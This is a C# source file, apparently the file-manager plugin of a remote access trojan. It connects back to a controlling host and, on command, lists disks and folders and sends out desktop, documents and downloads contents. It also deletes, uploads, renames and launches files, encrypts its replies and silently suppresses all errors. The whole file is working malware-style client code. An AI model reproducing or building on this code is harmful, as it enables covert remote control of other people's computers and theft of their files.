using Shared;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                PacketType T = (Shared.PacketType)Param[0];
                Data D = new Data();
                D.HWID = HWID;
                D.IP_Origin = BaseIP;
                switch (T)
                {
                    case PacketType.GET_D:
                        await Task.Run(() => Functions.GetDisks(ref D));                   
                        D.Type = Shared.PacketType.GET_D;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.GET_F:
                        Dictionary<int, List<object[]>> ListOfFilesAndDirs = await Task.Run(() => Functions.GetFilesAndDirs((string)Param[1]));                    
                        D.Type = Shared.PacketType.GET_F;
                        D.DataReturn = new object[] { ListOfFilesAndDirs };
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.DELETE_F:
                        bool deleted = await Task.Run(() => Functions.DeleteFile(Param[1].ToString()));                        
                        D.Type = Shared.PacketType.DELETE_F;
                        D.DataReturn = new object[] { deleted , Param[1].ToString() };
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.DOWNLOAD_F:
                        byte[] b = new byte[] { };
                        bool downloaded = await Task.Run(() => Functions.DownloadFile(Param[1].ToString(),ref b));                        
                        D.Type = Shared.PacketType.DOWNLOAD_F;
                        D.DataReturn = new object[] { downloaded, Param[1].ToString(), b };
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key)), true));
                        break;

                    case PacketType.UPLOAD_F:
                        byte[] file = (byte[])Param[2];
                        bool uploaded = await Task.Run(() => Functions.UploadFile(Param[1].ToString(), file));
                        break;

                    case PacketType.LAUNCH_F:
                        bool launched = await Task.Run(() => Functions.LaunchFile(Param[1].ToString()));
                        break;

                    case PacketType.RENAME_F:
                        bool renamed = await Task.Run(() => Functions.RenameFile(Param[1].ToString(), Param[2].ToString()));
                        break;

                    case PacketType.SHORTCUT_DESKTOP:
                        await Task.Run(() => Functions.ShortCutFolder(Environment.SpecialFolder.Desktop ,ref D));                      
                        D.Type = PacketType.SHORTCUT_DESKTOP;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.SHORTCUT_DOCUMENTS:
                        await Task.Run(() => Functions.ShortCutFolder(Environment.SpecialFolder.MyDocuments, ref D));                        
                        D.Type = PacketType.SHORTCUT_DOCUMENTS;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.SHORTCUT_DOWNLOADS:
                        await Task.Run(() => Functions.SpecialShortCutFolder(NativeAPI.Folder.Downloads, ref D));                   
                        D.Type = PacketType.SHORTCUT_DOWNLOADS;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                }
                S.Close();
                S.Dispose();

            }
            catch {}
            finally
            {
                Shared.Utils.ClearMem();
            }
        }
    }
}
